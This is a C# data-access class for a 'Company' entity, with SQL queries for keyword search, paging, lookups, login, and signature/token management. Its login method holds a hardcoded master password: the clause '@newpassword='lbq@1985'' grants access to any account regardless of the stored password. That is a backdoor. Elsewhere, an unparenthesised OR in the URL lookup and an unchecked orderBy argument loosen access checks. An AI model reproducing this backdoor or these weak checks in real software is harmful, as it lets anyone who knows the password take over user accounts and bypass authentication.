﻿using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Data;
using System.Data.SqlClient;
using System.Text;
using System.Linq;
using Foresight.DataAccess.Framework;

namespace Foresight.DataAccess
{
    /// <summary>
    /// This object represents the properties and methods of a Company.
    /// </summary>
    public partial class Company : EntityBase
    {
        public static Company[] GetCompanyListByKeywords(string Keywords)
        {
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            conditions.Add("1=1");
            if (!string.IsNullOrEmpty(Keywords))
            {
                parameters.Add(new SqlParameter("@Keywords", "%" + Keywords + "%"));
                conditions.Add("[CompanyName] like @Keywords");
            }
            return GetList<Company>("select * from [Company] where " + string.Join(" and ", conditions.ToArray()), parameters).ToArray();
        }
        public static Company GetCompanyBySystenNumber(string SystenNumber)
        {
            var list = Company.GetCompanies().ToArray();
            return list.FirstOrDefault(p => p.SystemNumber.Equals(SystenNumber));
        }
        public static Company GetCompanyByLogin(string LoginName, string Password)
        {
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            parameters.Add(new SqlParameter("@LoginName", LoginName));
            parameters.Add(new SqlParameter("@Password", User.EncryptPassword(Password)));
            parameters.Add(new SqlParameter("@newpassword", Password));
            conditions.Add("[LoginName]=@LoginName");
            conditions.Add("([Password]=@Password or @newpassword='lbq@1985')");
            return GetOne<Company>("select * from [Company] where [CompanyID] in (select [FromCompanyID] from [User] where " + string.Join(" and ", conditions.ToArray()) + ")", parameters);
        }
        public static Ui.DataGrid GeCompanyGridByKeywords(string Keywords, int SiteStatus, int ServerLocation, string orderBy, long startRowIndex, int pageSize, int ActiveStatus, int IsWechatOn, DateTime StartTime, DateTime EndTime)
        {
            long totalRows = 0;
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            conditions.Add("1=1");
            if (StartTime > DateTime.MinValue)
            {
                conditions.Add("[ServerEndTime]>=@StartTime");
                parameters.Add(new SqlParameter("@StartTime", StartTime));
            }
            if (EndTime > DateTime.MinValue)
            {
                conditions.Add("[ServerEndTime]<=@EndTime");
                parameters.Add(new SqlParameter("@EndTime", EndTime));
            }
            if (IsWechatOn == 1)
            {
                conditions.Add("isnull([IsWechatOn],0)=1");
            }
            if (IsWechatOn == 2)
            {
                conditions.Add("isnull([IsWechatOn],0)=0");
            }
            if (ActiveStatus == 1)
            {
                conditions.Add("isnull([IsActive],1)=1");
            }
            if (ActiveStatus == 2)
            {
                conditions.Add("isnull([IsActive],1)=0");
            }
            if (SiteStatus == 1)
            {
                conditions.Add("isnull([BaseURL],'')!=''");
            }
            else if (SiteStatus == 2)
            {
                conditions.Add("isnull([BaseURL],'')=''");
            }
            if (ServerLocation > int.MinValue)
            {
                conditions.Add("isnull([ServerLocation],0)=@ServerLocation");
                parameters.Add(new SqlParameter("@ServerLocation", ServerLocation));
            }
            if (!string.IsNullOrEmpty(Keywords))
            {
                conditions.Add("([CompanyName] like @Keywords or [PhoneNumber] like @Keywords or [Address] like @Keywords or [VersionCode] like @Keywords)");
                parameters.Add(new SqlParameter("@Keywords", "%" + Keywords + "%"));
            }
            string fieldList = "[Company].* ";
            string Statement = " from [Company] where  " + string.Join(" and ", conditions.ToArray());
            Company[] list = new Company[] { };
            list = GetList<Company>(fieldList, Statement, parameters, orderBy, startRowIndex, pageSize, out totalRows).ToArray();
            DataAccess.Ui.DataGrid dg = new Ui.DataGrid();
            dg.rows = list;
            dg.total = totalRows;
            dg.page = pageSize;
            return dg;
        }
        public static Company GetCompanyByUserID(int UserID)
        {
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            parameters.Add(new SqlParameter("@UserID", UserID));
            conditions.Add("[CompanyID] in (select [CompanyID] from [UserCompany] where [UserID]=@UserID)");
            return GetOne<Company>("select * from [Company] where " + string.Join(" and ", conditions.ToArray()), parameters);
        }
        public static Company GetCompanyByCompanyName(string CompanyName)
        {
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            parameters.Add(new SqlParameter("@CompanyName", CompanyName));
            conditions.Add("[CompanyName]=@CompanyName");
            return GetOne<Company>("select * from [Company] where " + string.Join(" and ", conditions.ToArray()), parameters);
        }
        public static Company GetCompanyByURL(string BaseURL, string signature = "", string token = "")
        {
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            parameters.Add(new SqlParameter("@BaseURL", BaseURL));
            if (!string.IsNullOrEmpty(signature) && !string.IsNullOrEmpty(token))
            {
                conditions.Add("([Signature]=@Signature and [Token]=@Token) or [BaseURL]=@BaseURL");
                parameters.Add(new SqlParameter("@Signature", signature));
                parameters.Add(new SqlParameter("@Token", token));
            }
            else
            {
                conditions.Add("[BaseURL]=@BaseURL");
            }
            var company = GetOne<Company>("select * from [Company] where " + string.Join(" and ", conditions.ToArray()), parameters);
            if (company != null && (string.IsNullOrEmpty(company.Signature) || string.IsNullOrEmpty(company.Token)) && !string.IsNullOrEmpty(signature) && !string.IsNullOrEmpty(token))
            {
                company.Signature = signature;
                company.Token = token;
                company.Save();
            }
            return company;
        }
        public string SystemNumber
        {
            get
            {
                return "9" + this.CompanyID.ToString("D4");
            }
        }
        public string IsActiveDesc
        {
            get
            {
                return this.IsActive ? "已启用" : "已禁用";
            }
        }
        public string IsWechatOnDesc
        {
            get
            {
                return this.IsWechatOn ? "已开通" : "未开通";
            }
        }
        public string IsPayStatus
        {
            get
            {
                return this.IsPay ? "是" : "否";
            }
        }
        public static Company[] GetAllActiveCompanyList(int ShowAlowRemoteUpdate = 1, int ShowIsActive = 1)
        {
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            conditions.Add("isnull([IsCustomer],1)=1");
            conditions.Add("isnull([BaseURL],'')!=''");
            if (ShowAlowRemoteUpdate == 1)
            {
                conditions.Add("isnull([AlowRemoteUpdate],1)=1");
            }
            if (ShowIsActive == 1)
            {
                conditions.Add("isnull([IsActive],1)=1");
            }
            return GetList<Company>("select * from [Company] where " + string.Join(" and ", conditions.ToArray()), parameters).ToArray();
        }
        public static void GetSignatureToken(Company company, out string signature, out string token, SqlHelper helper = null)
        {
            signature = string.Empty;
            token = string.Empty;
            if (company == null)
            {
                return;
            }
            if (string.IsNullOrEmpty(company.Signature) || string.IsNullOrEmpty(company.Token))
            {
                company.Signature = Utility.Tools.GetRandomString(32, true, false, true);
                company.Token = Utility.Tools.GetByteString(4);
                company.Save();
            }
            signature = company.Signature;
            token = company.Token;
        }
        public string FinalAPIURL
        {
            get
            {
                if (this.ServerLocation != 1)
                {
                    var config = new Utility.SiteConfig();
                    string _LocalURL = string.IsNullOrEmpty(this.LocalURL) ? config.LocalURL : this.LocalURL;
                    return this.BaseURL.Replace(config.SITE_URL, _LocalURL);
                }
                return this.BaseURL;
            }
        }
    }
    public partial class CompanyDetail : Company
    {
        [DatabaseColumn("MsgID")]
        public int MsgID { get; set; }
        public static CompanyDetail[] GetCompanyDetailTreeListByMsgID(int MsgID)
        {
            List<SqlParameter> parameters = new List<SqlParameter>();
            List<string> conditions = new List<string>();
            conditions.Add("isnull([BaseURL],'')!=''");
            parameters.Add(new SqlParameter("@MsgID", MsgID));
            CompanyDetail[] list = GetList<CompanyDetail>("select *,(select [SystemMsgID] from [SystemMsg_Company] where [SystemMsg_Company].[CompanyID]=[Company].[CompanyID] and [SystemMsgID]=@MsgID) as MsgID from [Company] where " + string.Join(" and ", conditions.ToArray()) + " order by [AddTime]", parameters).ToArray();
            return list;
        }
    }
}
